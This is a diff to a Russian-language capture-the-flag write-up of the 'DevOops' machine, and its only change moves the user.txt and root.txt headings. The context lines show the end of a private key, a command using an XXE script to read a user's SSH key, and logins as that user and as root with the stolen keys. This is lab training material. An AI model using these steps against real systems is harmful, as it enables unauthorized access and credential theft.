@@ -376,7 +376,6 @@ xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
 -----END RSA PRIVATE KEY-----
 ```
 
-### user.txt
 И на этом заканчивается первый способ, мы в системе :sweat_smile:
 ```text
 root@kali:~# python3 devoops_xxe.py /home/roosa/.ssh/id_rsa > roosa.key
@@ -398,6 +397,7 @@ roosa@gitter:~$ id
 uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
 ```
 
+### user.txt
 ```text
 roosa@gitter:~$ cat /home/roosa/user.txt
 c5808e16????????????????????????
@@ -692,7 +692,6 @@ index 44c981f..f4bde49 100644
 +
 ```
 
-### root.txt
 SSH-ключ. Заберем на Кали и ~~попробуем авторизоваться~~ авторизуемся с ним под суперпользователем:
 ```text
 root@kali:~# chmod 600 root.key
@@ -714,6 +713,7 @@ root@gitter:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+### root.txt
 ```text
 root@gitter:~# cat /root/root.txt
 d4fe1e7f????????????????????????
